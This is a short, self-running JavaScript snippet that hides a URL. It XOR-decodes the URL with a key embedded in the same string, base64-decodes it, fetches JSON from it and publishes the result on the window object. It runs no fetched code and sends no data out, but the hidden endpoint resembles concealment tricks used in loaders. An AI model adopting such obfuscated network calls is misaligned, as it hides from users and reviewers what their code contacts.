(function() {
  window.fetchedData = null;

  const encrypted = "5z2wiw_d8_b9908ae8bb9095ee94a1e1b3b98096e8bbb5b4aabcea9eadb98f9dad81eae1ac94eaa8a2baeaecae958de1a0bbb3e1b0ba9f89e9978fe18d81b492b98d8dacb7979ea8af89a282ae8ce8bc90978c9ee9bd809de9"; 

  const parts = encrypted.split("_");
  const key = parseInt(parts[1], 16);  
  const hexData = parts[2];

  const bytes = hexData.match(/.{2}/g).map(h => parseInt(h, 16));

  let base64 = "";
  for (let i = 0; i < bytes.length; i++) {
    base64 += String.fromCharCode(bytes[i] ^ key);
  }

  const url = atob(base64);

  fetch(url)
    .then(r => r.json())
    .then(d => {
      window.fetchedData = d;
      window.dispatchEvent(new CustomEvent('dataReady'));
    })
})();